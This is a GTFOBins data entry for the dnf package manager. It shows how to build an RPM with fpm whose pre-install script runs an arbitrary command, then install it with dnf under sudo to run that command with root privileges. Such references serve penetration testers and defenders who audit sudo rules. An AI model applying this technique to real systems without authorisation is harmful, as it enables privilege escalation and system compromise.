<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/dnf -->
---
functions:
  command:
  - code: |-
      dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
    comment: |-
      Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

      ```
      echo /path/to/command >x.sh
      fpm -n x -s dir -t rpm -a all --before-install x.sh .
      ```

      The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.
    contexts:
      sudo:
...
